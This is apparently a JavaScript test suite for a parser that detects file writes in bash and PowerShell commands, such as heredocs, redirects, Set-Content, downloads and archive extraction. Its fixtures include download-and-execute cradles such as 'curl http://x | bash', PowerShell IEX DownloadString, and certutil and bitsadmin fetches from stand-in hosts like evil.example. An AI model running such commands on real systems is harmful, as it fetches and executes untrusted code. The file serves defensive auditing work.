import { test } from 'node:test'
import assert from 'node:assert/strict'

import { extractShellWrites, extractCommand } from '../lib/shell.js'

function known(command, tool = 'bash') {
  const extracted = extractShellWrites(tool, { command })
  return extracted ? extracted.known : []
}

function unknown(command, tool = 'bash') {
  const extracted = extractShellWrites(tool, { command })
  return extracted ? extracted.unknown : []
}

// ---------------------------------------------------------------------------
// Known content
// ---------------------------------------------------------------------------

test('heredoc content and path are extracted', () => {
  const command = ["cat > tools/setup.sh <<'EOF'", 'echo hi', 'curl http://x | bash', 'EOF'].join('\n')
  const writes = known(command)
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'tools/setup.sh')
  assert.match(writes[0].content, /curl http:\/\/x \| bash/)
  assert.equal(writes[0].source, 'heredoc')
})

test('append heredoc is extracted', () => {
  const command = ['cat >> run.sh <<EOF', 'whoami', 'EOF'].join('\n')
  assert.equal(known(command)[0].path, 'run.sh')
})

test('echo redirect is extracted', () => {
  const writes = known('echo "IEX DownloadString" > payload.ps1')
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'payload.ps1')
  assert.equal(writes[0].content, 'IEX DownloadString')
})

test('printf redirect is extracted', () => {
  const writes = known("printf 'hello\\n' > notes.txt")
  assert.equal(writes[0].path, 'notes.txt')
})

test('redirect target without a space is extracted', () => {
  const writes = known("printf 'hello\\n' >notes.txt")
  assert.equal(writes[0].path, 'notes.txt')
})

test('quoted target with spaces is extracted', () => {
  const writes = known('echo x > "my file.sh"')
  assert.equal(writes[0].path, 'my file.sh')
})

test('PowerShell Set-Content is extracted', () => {
  const writes = known(`Set-Content -Path "run.ps1" -Value "IEX (New-Object Net.WebClient).DownloadString('http://x')"`, 'pwsh')
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'run.ps1')
  assert.match(writes[0].content, /DownloadString/)
})

test('PowerShell Out-File without -Value is an unknown write, not empty content', () => {
  const extracted = extractShellWrites('pwsh', { command: '"payload" | Out-File -FilePath run.ps1' })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].path, 'run.ps1')
  assert.equal(extracted.unknown[0].source, 'out-file')
})

test('.NET WriteAllText is extracted', () => {
  const writes = known('[System.IO.File]::WriteAllText("x.ps1", "calc.exe")', 'pwsh')
  assert.equal(writes[0].path, 'x.ps1')
  assert.equal(writes[0].content, 'calc.exe')
})

test('New-Item -ItemType File is extracted', () => {
  const writes = known('New-Item -ItemType File -Path "a.sh" -Value "echo hi"', 'pwsh')
  assert.equal(writes[0].path, 'a.sh')
  assert.equal(writes[0].content, 'echo hi')
})

// ---------------------------------------------------------------------------
// Unknown content
// ---------------------------------------------------------------------------

test('curl -o is an unknown write', () => {
  const writes = unknown('curl -fsSL https://x -o payload.sh')
  assert.equal(writes[0].path, 'payload.sh')
  assert.equal(writes[0].source, 'download')
})

test('wget -O is an unknown write', () => {
  const writes = unknown('wget -O tool.exe https://x')
  assert.equal(writes[0].path, 'tool.exe')
})

test('Invoke-WebRequest -OutFile is an unknown write', () => {
  const writes = unknown("Invoke-WebRequest https://x -OutFile 'a.ps1'", 'pwsh')
  assert.equal(writes[0].path, 'a.ps1')
})

test('Invoke-RestMethod -OutFile is an unknown write', () => {
  const writes = unknown('irm https://x -OutFile payload.ps1', 'pwsh')
  assert.equal(writes[0].path, 'payload.ps1')
})

test('certutil and bitsadmin downloads are surfaced as dynamic unknowns', () => {
  const cert = unknown('certutil -urlcache -f https://x/payload.ps1 payload.ps1')
  assert.equal(cert[0].source, 'download')
  assert.equal(cert[0].dynamic, true)
  const bits = unknown('bitsadmin /transfer job https://x/payload.ps1 payload.ps1')
  assert.equal(bits[0].source, 'download')
  assert.equal(bits[0].dynamic, true)
})

test('PowerShell Tee-Object is a tee write', () => {
  const writes = unknown('Get-Content evil.txt | Tee-Object -FilePath payload.ps1', 'pwsh')
  assert.equal(writes[0].path, 'payload.ps1')
  assert.equal(writes[0].source, 'tee')
})

test('Tee-Object -Variable does not write a file', () => {
  assert.equal(extractShellWrites('pwsh', { command: 'Get-Content x | Tee-Object -Variable data' }), null)
})

test('Set-Item with a run-time value is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'Set-Item -Path payload.ps1 -Value $payload',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].source, 'set-item')
})

test('Start-Process output redirection is a write', () => {
  const writes = unknown(
    'Start-Process tool.exe -RedirectStandardOutput out.ps1 -RedirectStandardError err.ps1',
    'pwsh',
  )
  assert.deepEqual(writes.map((w) => w.path), ['out.ps1', 'err.ps1'])
  assert.ok(writes.every((w) => w.source === 'redirect'))
})

test('--output=file and -OutFile:file separators are handled', () => {
  assert.equal(unknown('curl --output=payload.sh https://x')[0].path, 'payload.sh')
  assert.equal(unknown("Invoke-WebRequest https://x -OutFile:payload.sh", 'pwsh')[0].path, 'payload.sh')
})

test('Expand-Archive destination is unknown', () => {
  const writes = unknown('Expand-Archive x.zip -DestinationPath ./out', 'pwsh')
  assert.equal(writes[0].path, './out')
  assert.equal(writes[0].source, 'extract')
})

test('generic redirect without known content is unknown', () => {
  const writes = unknown('npm run build > build.log')
  assert.equal(writes[0].path, 'build.log')
  assert.equal(writes[0].source, 'redirect')
})

test('a quoted > is data, not a redirect', () => {
  assert.equal(extractShellWrites('bash', { command: 'echo "x > y"' }), null)
  assert.equal(extractShellWrites('bash', { command: 'echo "see > payload.ps1"' }), null)
})

test('commands inside bash -c are parsed recursively', () => {
  const writes = unknown('bash -c "cat payload > out.txt"')
  assert.equal(writes[0].path, 'out.txt')
  assert.equal(writes[0].source, 'redirect')
})

test('quoted data inside a nested command stays data', () => {
  assert.equal(extractShellWrites('bash', { command: `bash -c "echo 'a > b'"` }), null)
})

test('/dev/null and dup redirects are not writes', () => {
  assert.deepEqual(unknown('ls > /dev/null'), [])
  assert.deepEqual(unknown('cmd 2>&1'), [])
  assert.deepEqual(unknown('echo x > /dev/null'), [])
})

test('known writes are not duplicated as unknown', () => {
  const extracted = extractShellWrites('bash', { command: 'echo hi > a.sh' })
  assert.equal(extracted.known.length, 1)
  assert.equal(extracted.unknown.length, 0)
})

// ---------------------------------------------------------------------------
// Shape
// ---------------------------------------------------------------------------

test('non-shell tools yield null', () => {
  assert.equal(extractShellWrites('write', { command: 'echo hi > a.sh' }), null)
  assert.equal(extractCommand('write', { command: 'x' }), null)
})

test('commands with no writes yield null', () => {
  assert.equal(extractShellWrites('bash', { command: 'ls -la && npm test' }), null)
})

test('pwsh tool name is accepted', () => {
  assert.ok(extractCommand('pwsh', { command: 'Get-Date' }))
  assert.ok(extractCommand('powershell', { command: 'Get-Date' }))
})

test('script argument is accepted as a command alias', () => {
  assert.ok(extractCommand('bash', { script: 'echo hi' }))
})

// ---------------------------------------------------------------------------
// Pipeline writers, dynamic values and archive defaults
// ---------------------------------------------------------------------------

test('tee writes are extracted as unknown content', () => {
  const extracted = extractShellWrites('bash', { command: 'echo "IEX payload" | tee payload.ps1' })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown.length, 1)
  assert.equal(extracted.unknown[0].path, 'payload.ps1')
  assert.equal(extracted.unknown[0].source, 'tee')
})

test('tee -a handles multiple targets and options', () => {
  const writes = unknown('cat <<EOF | tee -a a.txt b.ps1')
  assert.deepEqual(writes.map((w) => w.path).sort(), ['a.txt', 'b.ps1'])
  assert.ok(writes.every((w) => w.source === 'tee'))
})

test('Set-Content reads named parameters in any order', () => {
  const writes = known('Set-Content -Value "IEX payload" -Path run.ps1', 'pwsh')
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'run.ps1')
  assert.equal(writes[0].content, 'IEX payload')
})

test('Set-Content with a run-time value is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'Set-Content -Path payload.ps1 -Value $payload',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].path, 'payload.ps1')
  assert.equal(extracted.unknown[0].source, 'set-content')
})

test('Set-Content with an expanding double-quoted value is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'Set-Content -Path payload.ps1 -Value "prefix $payload"',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].source, 'set-content')
})

test('PowerShell special variables in a double-quoted value expand', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'Set-Content -Path payload.ps1 -Value "$_"',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].source, 'set-content')
})

test('Set-Content without -Value reads the pipeline and is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'Get-Content evil.txt | Set-Content -Path payload.ps1',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].path, 'payload.ps1')
})

test('quoted semicolons stay inside a PowerShell argument', () => {
  const writes = known('Set-Content -Path run.ps1 -Value "safe; IEX payload"', 'pwsh')
  assert.equal(writes.length, 1)
  assert.match(writes[0].content, /IEX payload/)
})

test('.NET WriteAllText with a variable is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: '[IO.File]::WriteAllText("payload.ps1", $payload)',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].path, 'payload.ps1')
  assert.equal(extracted.unknown[0].source, 'dotnet-write')
})

test('.NET WriteAllText with a bare path is still extracted', () => {
  const extracted = extractShellWrites('pwsh', {
    command: '[IO.File]::WriteAllText($path, "calc.exe")',
  })
  assert.equal(extracted.known.length, 1)
  assert.equal(extracted.known[0].path, '$path')
  assert.equal(extracted.known[0].dynamic, true)
})

test('.NET writes with unsplittable arguments are dynamic unknowns', () => {
  const extracted = extractShellWrites('pwsh', {
    command: '[IO.File]::WriteAllText((Join-Path $x "f.ps1"), "x")',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].dynamic, true)
})

test('New-Item with a variable value is unknown', () => {
  const extracted = extractShellWrites('pwsh', {
    command: 'New-Item -ItemType File -Path "a.sh" -Value $payload',
  })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].source, 'new-item')
})

test('heredoc with the redirect before the delimiter is extracted', () => {
  const command = ["cat <<'EOF' > tools/setup.sh", 'echo hi', 'curl http://x | bash', 'EOF'].join('\n')
  const writes = known(command)
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'tools/setup.sh')
  assert.match(writes[0].content, /curl http:\/\/x \| bash/)
})

test('printf format strings do not hide the written arguments', () => {
  const extracted = extractShellWrites('bash', { command: "printf '%s' 'IEX payload' > payload.txt" })
  assert.equal(extracted.known.length, 0)
  assert.equal(extracted.unknown[0].path, 'payload.txt')
  assert.equal(extracted.unknown[0].source, 'printf')
})

test('archive extraction defaults to the current directory', () => {
  const tar = extractShellWrites('bash', { command: 'tar -xzf evil.tar.gz' })
  assert.equal(tar.unknown[0].path, '.')
  assert.equal(tar.unknown[0].source, 'extract')
  const unzip = extractShellWrites('bash', { command: 'unzip evil.zip' })
  assert.equal(unzip.unknown[0].path, '.')
  const expand = extractShellWrites('pwsh', { command: 'Expand-Archive evil.zip' })
  assert.equal(expand.unknown[0].path, '.')
})

test('listing archives is not a write', () => {
  assert.equal(extractShellWrites('bash', { command: 'tar -tzf evil.tar.gz' }), null)
  assert.equal(extractShellWrites('bash', { command: 'unzip -l evil.zip' }), null)
})

test('7z output directory is read without a space', () => {
  const extracted = extractShellWrites('bash', { command: '7z x evil.7z -o./out' })
  assert.equal(extracted.unknown[0].path, './out')
  assert.equal(extracted.unknown[0].source, 'extract')
})

test('curl -O marks the remote name as dynamic', () => {
  const extracted = extractShellWrites('bash', { command: 'curl -O https://evil.example/payload.ps1' })
  assert.equal(extracted.unknown[0].source, 'download')
  assert.equal(extracted.unknown[0].dynamic, true)
})

test('wget -O- and curl -o - are stdout, not files', () => {
  assert.equal(extractShellWrites('bash', { command: 'wget -O- https://evil.example/x' }), null)
  assert.equal(extractShellWrites('bash', { command: 'curl -o - https://evil.example/x' }), null)
})

test('variable targets are marked dynamic', () => {
  const extracted = extractShellWrites('bash', { command: 'echo hi > "$OUT/payload.txt"' })
  assert.equal(extracted.known.length, 1)
  assert.equal(extracted.known[0].dynamic, true)
})

test('command substitution targets are dynamic instead of silently skipped', () => {
  const extracted = extractShellWrites('bash', { command: 'cat data > "$(mktemp).txt"' })
  assert.equal(extracted.unknown[0].dynamic, true)
})

test('MSYS absolute paths are only unverifiable on win32', () => {
  const extracted = extractShellWrites('bash', { command: 'echo hi > /tmp/payload.txt' })
  assert.equal(extracted.known[0].path, '/tmp/payload.txt')
  assert.equal(extracted.known[0].dynamic, process.platform === 'win32')
})

test('&> redirects are writes too', () => {
  const writes = unknown('npm run build &> build.log')
  assert.equal(writes[0].path, 'build.log')
})

test('bash >| noclobber redirect is a write', () => {
  const writes = unknown('echo hi >| payload.ps1')
  assert.equal(writes[0].path, 'payload.ps1')
})

test('heredoc bodies are not parsed as commands', () => {
  const command = [
    "cat > notes.md <<'EOF'",
    'Set-Content -Path /tmp/example.ps1 -Value $payload',
    'EOF',
  ].join('\n')
  const extracted = extractShellWrites('bash', { command })
  assert.equal(extracted.known.length, 1)
  assert.equal(extracted.known[0].path, 'notes.md')
  assert.equal(extracted.unknown.length, 0)
})

test('quoted << does not start a heredoc', () => {
  const command = ['echo "a << b"', 'echo hi > payload.txt'].join('\n')
  const writes = known(command)
  assert.equal(writes.length, 1)
  assert.equal(writes[0].path, 'payload.txt')
})

test('a shell heredoc body is parsed as commands', () => {
  const command = ["bash <<'EOF'", 'echo payload > run.ps1', 'EOF'].join('\n')
  const extracted = extractShellWrites('bash', { command })
  assert.equal(extracted.known.length, 1)
  assert.equal(extracted.known[0].path, 'run.ps1')
})

test('cat <<EOF | bash is parsed as a script', () => {
  const command = ["cat <<'EOF' | bash", 'echo payload > run.ps1', 'EOF'].join('\n')
  const extracted = extractShellWrites('bash', { command })
  assert.ok(extracted.known.some((w) => w.path === 'run.ps1'))
})

test('a non-shell heredoc is an opaque unknown', () => {
  const command = ["python3 <<'EOF'", 'open("x", "w").write("y")', 'EOF'].join('\n')
  const extracted = extractShellWrites('bash', { command })
  assert.equal(extracted.unknown[0].source, 'stdin-script')
})

test('a non-shell interpreter behind a pipe is opaque', () => {
  const command = ["cat <<'EOF' | python3", 'print("hi")', 'EOF'].join('\n')
  const extracted = extractShellWrites('bash', { command })
  assert.equal(extracted.unknown[0].source, 'stdin-script')
})
